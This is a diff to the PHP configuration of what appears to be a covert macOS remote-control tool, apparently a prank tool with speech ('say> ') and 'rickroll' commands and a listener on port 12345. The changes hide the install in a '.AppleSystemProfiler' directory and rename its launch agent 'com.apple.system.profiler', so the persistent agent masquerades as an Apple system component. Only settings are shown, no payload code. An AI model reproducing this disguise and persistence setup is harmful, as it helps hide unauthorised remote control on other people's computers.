@@ -6,7 +6,7 @@ define('SERVER_HOST', $protocol . $_SERVER['HTTP_HOST'] . '/');
 // define('SILENT_SUFFIX', '> /dev/null 2>&1 &');
 
 // Use this for debugging (scripts will output to /tmp/ss.log)
-define('SILENT_SUFFIX', '> /tmp/ss.log 2>&1 &');
+define('SILENT_SUFFIX', '>> /tmp/ss.log 2>&1 &');
 
 define('DB_TABLE_PREFIX', 'ss_');
 define('DB_TABLE_SIGNUP', DB_TABLE_PREFIX . 'signup');
@@ -17,17 +17,14 @@ global $ss_config, $b64_config;
 
 $ss_config = array(
     'DIR_MAIN' => '.AppleSystemProfiler',
-    'DIR_PING' => '/tmp/sbin',
     'DIR_BIN' => 'bin',
-    'DIR_LAUNCH_AGENTS' => 'Library/LaunchAgents',
-    'DIR_LOCAL_BIN' => '/usr/local/bin',
+    'DIR_AGENT' => 'lib',
+    'DIR_LOCAL_BIN' => '~/.bin',
 
     'FILE_MAIN_BINARY' => 'ctl',
     'FILE_MAIN_MONITOR' => 'monitor',
     'FILE_MAIN_SCANNER' => 'scan',
-    'FILE_PING_BINARY' => 'sys',
-    'FILE_PING_MONITOR' => 'mon',
-    'FILE_LAUNCH_PLIST' => 'com.user.loginscript',
+    'FILE_LAUNCH_PLIST' => 'com.apple.system.profiler',
     'FILE_PHP_BINARY' => '/usr/bin/php',
     'FILE_INSTALLER' => 'ss_install',
     'FILE_REMOVER' => 'ss_remove'
@@ -46,7 +43,6 @@ $b64_config = array(
     'CONST_PORT_MAX' => 65535,
     'CONST_SS_PORT' => 12345,
     'CONST_PROMPT' => 'say> ',
-    'CONST_PING_INTERVAL' => 10,
 
     'SS_CMD_QUIT' => 'quit|exit|shutdown',
     'SS_CMD_RICKROLL' => 'rickroll',
@@ -71,7 +67,6 @@ $b64_config = array(
 
     'STR_SERVER_HOST' => SERVER_HOST,
     'STR_DEFAULT_VOICE' => 'alex',
-    'STR_PING_ARG' => 'ping',
     'STR_INTERFACE_PREFIX' => 'en',
     'STR_DEFAULT_IP' => '127.0.0.1',
     'STR_CURRENT_VOICE' => 'Current voice is:',
